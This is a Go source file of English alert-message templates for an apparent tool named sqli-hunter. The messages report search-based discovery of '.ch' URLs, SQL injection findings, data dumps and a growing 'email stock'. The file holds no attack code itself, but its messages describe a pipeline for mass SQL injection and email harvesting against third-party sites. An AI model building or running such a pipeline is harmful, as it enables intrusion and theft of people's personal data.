package alert

import (
	"fmt"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

var en = Texts{
	TitleDailyLaunch:   "Daily started",
	TitleScanComplete:  "Scan complete",
	TitleDailyComplete: "Daily complete",

	Launch:       enLaunch,
	DiscoverDone: enDiscoverDone,
	ScanStarted:  enScanStarted,
	Vuln:         enVuln,
	DumpFail:     enDumpFail,
	DumpOK:       enDumpOK,
	Complete:     enComplete,
	Error:        enError,
	StockSummary: enStockSummary,
	DailyLaunch:  enDailyLaunch,
	DailyNoNew:   enDailyNoNew,
}

func enLaunch(title, detail string) string {
	return "🚀 " + title + "\n" + detail
}

func enDiscoverDone(kept, skipped, fetched int) string {
	return fmt.Sprintf("🔎 Discover done\nURLs kept: %d\nskipped: %d\nfetched: %d", kept, skipped, fetched)
}

func enScanStarted(urlCount int, listFile string) string {
	return fmt.Sprintf("▶️ Scan started\nurls: %d\nfile: %s", urlCount, listFile)
}

func enVuln(f models.Finding) string {
	return "🔴 VULN " + string(f.VulnType) + "\n" + formatFinding(f)
}

func enDumpFail(f models.Finding, reason string) string {
	return "⚠️ Dump failed\n" + formatFinding(f) + "\nreason: " + reason
}

func enDumpOK(d models.ExtractedData, email string) string {
	return "✅ Dump OK\n" + formatDumpDetail(d, email)
}

func enComplete(title, detail string) string {
	return "🏁 " + title + "\n" + detail
}

func enError(msg string) string {
	return "❌ " + msg
}

func enStockSummary(baseDir string) string {
	return stockLines(baseDir, "email stock:", "• %s — %d", "email stock: empty")
}

func enDailyLaunch(limit, threads int, outputDir string) string {
	return fmt.Sprintf("discover: .ch Google\nlimit: %d urls\nthreads: %d\noutput: %s/emails/", limit, threads, outputDir)
}

func enDailyNoNew(baseDir string) string {
	return "Nothing new\n" + enStockSummary(baseDir)
}
